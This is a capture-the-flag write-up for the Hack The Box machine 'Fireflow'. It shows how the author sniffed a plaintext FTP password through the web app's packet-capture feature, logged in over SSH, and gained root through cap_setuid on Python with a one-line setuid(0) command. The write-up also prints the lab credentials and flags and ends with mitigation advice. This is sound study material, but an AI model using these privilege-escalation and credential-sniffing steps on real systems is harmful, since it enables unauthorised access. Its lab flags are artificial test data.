# HTB: Fireflow

| Info | Detail |
|------|--------|
| OS | Linux (Ubuntu, OpenSSH 8.2p1 Ubuntu 4ubuntu0.2) |
| Difficulty | Easy |
| IP | 10.129.86.147 → 10.129.86.228 (box reset mid-engagement) |
| Date | 2026-08-13 |
| Status | ✅ Rooted |

> The web app self-identifies as "Security Dashboard" — the HTB machine name is **Fireflow**.

## Attack Chain

```
Web recon → "Security Dashboard" (Gunicorn) on :80
→ /capture endpoint runs a server-side 5s tcpdump of ALL host traffic
→ repeatedly trigger /capture, download resulting .pcap via /download/<n>
→ pcap catches the box's own internal plaintext FTP login (nathan)
→ SSH as nathan → user flag
→ getcap: cap_setuid on /usr/bin/python3.8
→ python3.8 os.setuid(0) → root flag
```

---

## Reconnaissance

### Port Scan

```
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.2
80/tcp open  http    Gunicorn ("Security Dashboard")
```

### Web Enumeration

The site is a network "Security Dashboard" exposing live host telemetry:

- `/` — dashboard home
- `/ip` — renders live `ifconfig` output from the target
- `/netstat` — renders live `netstat` output from the target
- `/capture` — triggers a live **5-second server-side `tcpdump` capture**, redirects to `/data/<n>`
- `/data/<n>` — HTML analysis of capture `<n>` (packet counts by protocol)
- `/download/<n>` — raw `.pcap` file for capture `<n>`

Gobuster (`common.txt`) surfaced nothing beyond the above. FTP anonymous login denied (530).

---

## Foothold — Packet-Capture Credential Leak

The `/capture` endpoint's `tcpdump` snapshot records **all traffic on the box's interface** during its 5-second window — not just the requesting client's own traffic. Anything else on the host that talks to another service during that window is captured too.

**Approach**: repeatedly trigger `/capture` (flooding the box with concurrent HTTP requests to widen the odds of catching interesting traffic in the 5s window), then pull each resulting `.pcap` via `/download/<n>` and inspect it:

```bash
tcpdump -r capture_0.pcap -A
```

`download/0` caught a **plaintext FTP login performed by the box itself** — an internal monitoring/health-check process periodically authenticating to its own FTP server:

```
USER nathan
PASS Buck3tH4TF0RM3!
230 Login successful.
```

The "security dashboard" ironically leaks its own service credentials to any user who can trigger enough captures.

---

## User

The captured credentials worked directly over SSH:

```bash
ssh nathan@10.129.86.228   # Buck3tH4TF0RM3!
```

**User flag**: `63a9a3c842f0c1e7094ef2642bcd2f38`

---

## Privilege Escalation — `cap_setuid` on Python

Capability audit revealed a `setuid`-capable interpreter:

```bash
getcap -r / 2>/dev/null
# /usr/bin/python3.8 = cap_setuid,cap_net_bind_service+eip
```

`cap_setuid` on an interpreter is equivalent to full root — the [GTFOBins](https://gtfobins.github.io/gtfobins/python/#capabilities) capability technique:

```bash
python3.8 -c 'import os; os.setuid(0); os.system("id; cat /root/root.txt")'
# uid=0(root) gid=1001(nathan) ...
```

**Root flag**: `d6e389c6c155ebb52d8f7f78b4638ec0`

---

## Notes

- Box IP reset once mid-engagement (`.147` → `.228`). Re-ran recon from scratch on the new instance rather than assuming carried state — the FTP vuln/creds were consistent but had to be re-discovered.
- `/download/<n>` had no path traversal (`../` and URL-encoded variants both 404).
- No command injection on `/capture` query params (`filter`, `bpf`, `iface` — all just incremented the capture number with no behavioral difference).

## Lessons Learned / Mitigation

- **Never use cleartext FTP for internal service-to-service auth**, even for monitoring — use key-based auth or FTPS/SFTP. A monitoring process logging into plaintext FTP on a loop is the entire kill chain here.
- **A user-exposed packet-capture feature must be scoped to the requesting user's own traffic**, not the whole host interface — otherwise it's a network-wide credential sniffer as-a-service.
- **Audit binary capabilities** (`getcap -r /`) as standard hardening — `cap_setuid` on an interpreter is equivalent to passwordless sudo-to-root for anyone who can execute it.
